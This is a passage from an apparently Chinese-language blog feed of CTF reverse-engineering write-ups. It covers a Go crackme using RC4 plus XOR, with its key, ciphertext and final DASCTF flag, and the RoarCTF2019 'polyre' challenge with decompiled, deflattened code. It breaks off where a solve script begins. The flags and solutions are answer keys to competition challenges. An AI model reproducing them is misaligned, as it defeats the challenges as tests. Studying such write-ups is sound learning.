__int64 v16; <span class="comment">// [rsp+18h] [rbp-50h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+20h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [rsp+28h] [rbp-40h]</span></span><br><span class="line">  <span class="type">char</span> v19[<span class="number">32</span>]; <span class="comment">// [rsp+38h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+58h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+68h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0xFFFFFFF8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( &amp;retaddr &lt;= *(v9 + <span class="number">16</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  runtime_makeslice(a1, a2, a3, v9, a5, a6, &amp;unk_4B0EE0, a8, a8);</span><br><span class="line">  v20 = v16;</span><br><span class="line">  runtime_stringtoslicebyte(a1, a2, qword_55E898, main_enc_key, v10, v11, v19, main_enc_key, qword_55E898);</span><br><span class="line">  crypto_rc4_NewCipher(a1, a2, v18, v17, v12);</span><br><span class="line">  crypto_rc4___Cipher__XORKeyStream(a1, a2, a9, a8, v13, v14);</span><br><span class="line">  <span class="keyword">return</span> a8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到了两个 rc4 加密的函数，说明这里是将输入的字符串进行了 rc4 加密，并且可以看到 21 行这里看到有一个 main_enc_key，这应该就是密钥了，可以直接看到它的值 &quot;thisiskkk&quot;，然后在这里突然又想起在外面那个函数也看到一个类似这个的东西，就是 main_enc，然后点进去看发现是个数组，这刚好和密钥的名字对应，肯定就是加密后的结果了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xD8, 0xE5, 0x85, 0xBE, 0xE7, 0xF8, 0x58, 0x75, 0x95, 0x65, </span><br><span class="line">0x85, 0xE3, 0xA6, 0x47, 0x59, 0xB9, 0x14, 0x6F, 0x33, 0xB5, </span><br><span class="line">0xCA, 0x84, 0x0B, 0xE7, 0x92, 0x0E, 0xD2, 0xFD, 0x64, 0x18, </span><br><span class="line">0x96, 0xD0, 0x0F, 0x5E, 0x44, 0x3E</span><br></pre></td></tr></table></figure><p>不过这不是最终的加密结果，一开始没有发现，最后这一串还异或了一个 0x23，在 ida 左侧的函数栏里面还有一个带有 main 的函数 main_init_0，在这个里面又将 rc4 后的结果进行了一次异或，所以虽然说名字像不一定是百分百有联系，但还是看一下比较好，官方的 wp 说还可以通过动调来直接找这个最终的密文，一开始也尝试了动调，但我是直接用 ida 的远程调试的，搞了很久没搞出来，可以用 gdb 调试，但 dlv 会更方便（不会 dlv）</p><h1 id="总体思路"><a class="markdownIt-Anchor" href="#总体思路">#</a> 总体思路</h1><p>程序将输入的字符串进行一次 rc4 加密再进行一次异或，我们只要先异或再解密就行了，知道了 key 和密文，再 rc4 解密一下就行了，解密脚本用的是一位大佬写的，解密之后得到 56e83694-f976-11eb-b343-faffc201c8e0，在 linux 中运行程序的时候，输入这个字符串，也会弹出提示，最终的 flag 是 DASCTF {md5 (Input)}，所以在程序的分析中没有发现这个也是没问题的</p><p>得到 flag：<strong>DASCTF{9e1963bbbb1285b993c862a5a6f12604}</strong></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF2019-polyre</title>
      <link href="/2022/07/22/RoarCTF2019-polyre/"/>
      <url>/2022/07/22/RoarCTF2019-polyre/</url>
      
        <content type="html"><![CDATA[<p>这道题刚打开看它的主函数的时候，看到它的控制流程图</p><img src="/2022/07/22/RoarCTF2019-polyre/1.png" class><p>而且主函数的代码也是一个非常长的循环，我们需要对它进行控制流平坦化，这里我是在 kali 中用 deflat.py 脚本操作的</p><img src="/2022/07/22/RoarCTF2019-polyre/2.png" class><p>平坦化之后就可以看正常的代码了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v4; <span class="comment">// [rsp+1E0h] [rbp-110h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1E8h] [rbp-108h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">48</span>]; <span class="comment">// [rsp+1F0h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">60</span>]; <span class="comment">// [rsp+220h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [rsp+25Ch] [rbp-94h]</span></span><br><span class="line">  <span class="type">char</span> *v11; <span class="comment">// [rsp+260h] [rbp-90h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+26Ch] [rbp-84h]</span></span><br><span class="line">  <span class="type">bool</span> v13; <span class="comment">// [rsp+272h] [rbp-7Eh]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// [rsp+273h] [rbp-7Dh]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [rsp+274h] [rbp-7Ch]</span></span><br><span class="line">  <span class="type">char</span> *v16; <span class="comment">// [rsp+278h] [rbp-78h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+284h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [rsp+288h] [rbp-68h]</span></span><br><span class="line">  <span class="type">bool</span> v19; <span class="comment">// [rsp+28Fh] [rbp-61h]</span></span><br><span class="line">  <span class="type">char</span> *v20; <span class="comment">// [rsp+290h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [rsp+298h] [rbp-58h]</span></span><br><span class="line">  <span class="type">bool</span> v22; <span class="comment">// [rsp+29Fh] [rbp-51h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+2A0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">bool</span> v24; <span class="comment">// [rsp+2AFh] [rbp-41h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+2B0h] [rbp-40h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+2B8h] [rbp-38h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+2C0h] [rbp-30h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+2C8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// [rsp+2D0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// [rsp+2D4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> *v31; <span class="comment">// [rsp+2D8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// [rsp+2E0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [rsp+2E4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">bool</span> v34; <span class="comment">// [rsp+2EBh] [rbp-5h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">  v11 = s;</span><br><span class="line">  <span class="keyword">if</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; (((dword_603054 - <span class="number">1</span>) * dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v11);</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_603058 &lt; <span class="number">10</span> || (((dword_603054 - <span class="number">1</span>) * dword_603054) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_43:</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v11);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v12 = v6;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; (((dword_603054 - <span class="number">1</span>) * dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    v13 = v12 &lt; <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; (((dword_603054 - <span class="number">1</span>) * dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v14 = s[v6];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v15 = v14;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; (((dword_603054 - <span class="number">1</span>) * dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">if</span> ( v15 == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = &amp;s[v6];</span><br><span class="line">      *v16 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = v6 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v6 = v17;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; (((dword_603054 - <span class="number">1</span>) * dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v18 = i;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; (((dword_603054 - <span class="number">1</span>) * dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v19 = v18 &lt; <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; (((dword_603054 - <span class="number">1</span>) * dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !v19 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v20 = s;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; (((dword_603054 - <span class="number">1</span>) * dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    v4 = *&amp;v20[<span class="number">8</span> * i];</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = v7;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        v22 = v21 &lt; <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; (((dword_603054 - <span class="number">1</span>) * dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v23 = v4;</span><br><span class="line">      v24 = v4 &lt; <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v27 = v4;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          v28 = <span class="number">2</span> * v27;</span><br><span class="line">        <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; (((dword_603054 - <span class="number">1</span>) * dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">        v4 = v28;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v25 = <span class="number">2</span> * v4;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          v26 = v25;</span><br><span class="line">        <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; (((dword_603054 - <span class="number">1</span>) * dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">        v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      v29 = v7;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        v7 = v29 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; (((dword_603054 - <span class="number">1</span>) * dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    v30 = <span class="number">8</span> * i;</span><br><span class="line">    v31 = &amp;s1[<span class="number">8</span> * i];</span><br><span class="line">    <span class="keyword">if</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; (((dword_603054 - <span class="number">1</span>) * dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">LABEL_55:</span><br><span class="line">      *v31 = v4;</span><br><span class="line">    *v31 = v4;</span><br><span class="line">    <span class="keyword">if</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; (((dword_603054 - <span class="number">1</span>) * dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">    v32 = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    v33 = <span class="built_in">memcmp</span>(s1, &amp;unk_402170, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; (((dword_603054 - <span class="number">1</span>) * dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">  v34 = v33 != <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; (((dword_603054 - <span class="number">1</span>) * dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v34 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但实际上这还是挺长的，不过这里面有很多重复的无用语句可以删掉，官方的 wp 也有一个脚本可以简化代码，我就直接看简化后的代码了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v4; <span class="comment">// [rsp+1E0h] [rbp-110h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> j; <span class="comment">// [rsp+1E8h] [rbp-108h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> k; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">48</span>]; <span class="comment">// [rsp+1F0h] [rbp-100h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">60</span>]; <span class="comment">// [rsp+220h] [rbp-D0h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [rsp+25Ch] [rbp-94h]</span></span><br><span class="line">  <span class="type">char</span> *v11; <span class="comment">// [rsp+260h] [rbp-90h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+26Ch] [rbp-84h]</span></span><br><span class="line">  <span class="type">bool</span> v13; <span class="comment">// [rsp+272h] [rbp-7Eh]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// [rsp+273h] [rbp-7Dh]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [rsp+274h] [rbp-7Ch]</span></span><br><span class="line">  <span class="type">char</span> *v16; <span class="comment">// [rsp+278h] [rbp-78h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+284h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [rsp+288h] [rbp-68h]</span></span><br><span class="line">  <span class="type">bool</span> v19; <span class="comment">// [rsp+28Fh] [rbp-61h]</span></span><br><span class="line">  <span class="type">char</span> *v20; <span class="comment">// [rsp+290h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [rsp+298h] [rbp-58h]</span></span><br><span class="line">  <span class="type">bool</span> v22; <span class="comment">// [rsp+29Fh] [rbp-51h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+2A0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">bool</span> v24; <span class="comment">// [rsp+2AFh] [rbp-41h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+2B0h] [rbp-40h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+2B8h] [rbp-38h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+2C0h] [rbp-30h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+2C8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// [rsp+2D0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// [rsp+2D4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> *v31; <span class="comment">// [rsp+2D8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// [rsp+2E0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [rsp+2E4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">bool</span> v34; <span class="comment">// [rsp+2EBh] [rbp-5h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  v11 = s;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s, (dword_603054 - <span class="number">1</span>), <span class="number">3788079310LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = i;</span><br><span class="line">    v13 = i &lt; <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="number">64</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v14 = s[i];</span><br><span class="line">    v15 = v14;</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = &amp;s[i];</span><br><span class="line">      *v16 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = j;</span><br><span class="line">    v19 = j &lt; <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">if</span> ( j &gt;= <span class="number">6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v20 = s;</span><br><span class="line">    v4 = *&amp;s[<span class="number">8</span> * j];</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; ; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = k;</span><br><span class="line">      v22 = k &lt; <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">if</span> ( k &gt;= <span class="number">64</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v23 = v4;</span><br><span class="line">      v24 = v4 &lt; <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v27 = v4;</span><br><span class="line">        v28 = <span class="number">2</span> * v4;</span><br><span class="line">        v4 *= <span class="number">2LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v25 = <span class="number">2</span> * v4;</span><br><span class="line">        v26 = <span class="number">2</span> * v4;</span><br><span class="line">        v4 = <span class="number">2</span> * v4 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      v29 = k;</span><br><span class="line">    &#125;</span><br><span class="line">    v30 = <span class="number">8</span> * j;</span><br><span class="line">    v31 = &amp;s1[<span class="number">8</span> * j];</span><br><span class="line">    *v31 = v4;</span><br><span class="line">    v32 = j + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v33 = <span class="built_in">memcmp</span>(s1, &amp;unk_402170, <span class="number">0x30</span>uLL);</span><br><span class="line">  v34 = v33 != <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v33 != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简化后再看它的逻辑就比较清晰了，先是输入一串长为 0x30 也就是 48 的字符串，将每八个字节分为一组一共六组，然后取每一组的首个数据进行正负判断，如果是正就乘 2 也就是左移一位，为负也是左移一位但还要进行一次异或运算，一共循环 64 次，这个是用 CRC32 算法来取得一个查表法所用的表，而在后面还有一次 CRC64 的加密，这里我还不是很懂，只能搞出这个表，看网上的 wp 最后一步都要再右移八位，这个应该就是 CRC64 的操作了，最后在和 &amp; unk_402170 进行对比，这个就是最后的数据了，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 